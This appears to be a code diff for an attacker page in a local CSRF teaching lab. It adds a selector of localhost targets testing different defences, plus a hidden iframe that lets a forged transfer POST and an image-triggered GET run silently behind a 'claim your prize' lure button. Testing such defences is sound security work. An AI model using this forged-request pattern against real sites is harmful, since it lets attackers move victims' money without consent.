@@ -21,10 +21,33 @@
                 que funcionan contra la app vulnerable (local).
               </p>
 
-              <div class="mt-3">
+              <div class="mt-3 d-flex gap-2 align-items-center">
                 <button id="lure" class="btn btn-warning">
                   Reclamar premio
                 </button>
+                <div class="ms-2">
+                  <label class="form-label small mb-1">Objetivo</label>
+                  <select id="target-select" class="form-select form-select-sm">
+                    <option value="http://localhost:3000">
+                      Vulnerable (3000)
+                    </option>
+                    <option value="https://localhost:3010">
+                      Token CSRF (3010 HTTPS)
+                    </option>
+                    <option value="http://127.0.0.1:3020">
+                      SameSite Strict (3020)
+                    </option>
+                    <option value="http://127.0.0.1:3021">
+                      SameSite Lax (3021)
+                    </option>
+                    <option value="https://localhost:3022">
+                      SameSite None (3022 HTTPS)
+                    </option>
+                    <option value="http://localhost:3030">
+                      Headers (3030)
+                    </option>
+                  </select>
+                </div>
               </div>
 
               <hr />
@@ -40,11 +63,13 @@
                 </li>
               </ul>
 
-              <!-- Formulario oculto: apuntamos a la app vulnerable (puerto 3000) -->
+              <!-- Formulario oculto: objetivo configurable; se envía a un iframe oculto para no navegar -->
+              <iframe name="stealth_iframe" style="display: none"></iframe>
               <form
                 id="csrf-form"
                 action="http://localhost:3000/transferencia"
                 method="POST"
+                target="stealth_iframe"
               >
                 <input type="hidden" name="monto" value="200" />
                 <input type="hidden" name="destino" value="cuenta-atacante" />
@@ -68,18 +93,25 @@
       </div>
     </div>
     <script>
+      const select = document.getElementById("target-select");
+      const form = document.getElementById("csrf-form");
+      const img = document.getElementById("steal-img");
+
       document.getElementById("lure").addEventListener("click", () => {
         // Después de que el usuario haga clic, lanzamos los ataques ocultos
-        setTimeout(() => document.getElementById("csrf-form").submit(), 800);
-        document.getElementById("steal-img").src =
-          "http://localhost:3000/donar?monto=10&destino=cuenta-atacante";
+        const base = select.value;
+        form.action = `${base}/transferencia`;
+        setTimeout(() => form.submit(), 800);
+        img.src = `${base}/donar?monto=10&destino=cuenta-atacante`;
         alert(
           "¡Felicidades! Has reclamado tu premio. Revisa tu correo (simulado)."
         );
       });
 
       document.getElementById("manual").addEventListener("click", () => {
-        document.getElementById("csrf-form").submit();
+        const base = select.value;
+        form.action = `${base}/transferencia`;
+        form.submit();
       });
     </script>
   </body>
